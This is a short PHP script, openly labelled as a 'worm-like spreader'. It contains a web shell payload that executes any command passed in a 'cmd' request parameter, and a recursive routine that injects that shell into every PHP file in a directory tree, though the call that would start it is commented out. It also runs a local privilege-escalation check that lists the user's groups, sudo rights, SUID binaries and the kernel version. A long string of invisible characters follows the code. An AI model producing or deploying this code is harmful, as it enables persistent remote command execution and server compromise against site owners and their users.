<?php
// Recursive PHP file injector (worm-like spreader)
$payload = '<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";}?>';

function infect($dir) {
    if (!is_readable($dir)) return;
    $files = @scandir($dir);
    if (!$files) return;
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        $path = $dir . '/' . $file;
        if(is_dir($path)) {
            infect($path);
        } elseif(pathinfo($path, PATHINFO_EXTENSION) == 'php') {
            $content = @file_get_contents($path);
            if($content !== false && strpos($content, 'cmd') === false) {
                @file_put_contents($path, $payload . "\n" . $content);
            }
        }
    }
}
// Uncomment to run infection on current directory:
// infect(__DIR__);

// Local Privilege Escalation (LPE) Checker
echo "<pre>";
echo "=== CURRENT USER & GROUPS ===\n";
echo shell_exec('id; groups');
echo "\n=== SUDO PERMISSIONS ===\n";
echo shell_exec('sudo -l 2>&1');
echo "\n=== SUID BINARIES ===\n";
echo shell_exec('find / -perm -4000 2>/dev/null');
echo "\n=== KERNEL & OS VERSION ===\n";
echo shell_exec('uname -a; cat /etc/os-release');
echo "</pre>";
?>
```‍⁣⁤⁢⁢⁡⁤‌⁡⁣⁠⁣‍‌⁡⁣⁣⁤⁢⁢⁣‍⁡⁠⁡⁣⁣⁤⁢⁢⁢⁤‍‌⁢⁣⁤‌⁡⁤‌⁣‍‌⁡⁡⁣⁠⁢⁡⁢⁠⁡⁡⁣⁤⁢⁣⁢⁠⁡⁣‍‌⁢⁠⁢⁤‍‌⁣⁠⁡⁣⁠⁢⁢⁤‌⁠⁣⁣‍‌⁢‌⁡⁣⁣‌⁢⁢⁤⁠⁡⁡⁣‍⁢⁣⁠‌⁣⁣⁠⁡⁢⁤⁠⁠⁣⁣⁢‌⁡⁣⁣‌⁡‍⁠⁡⁡⁣‍⁢⁡⁣⁤‌⁡
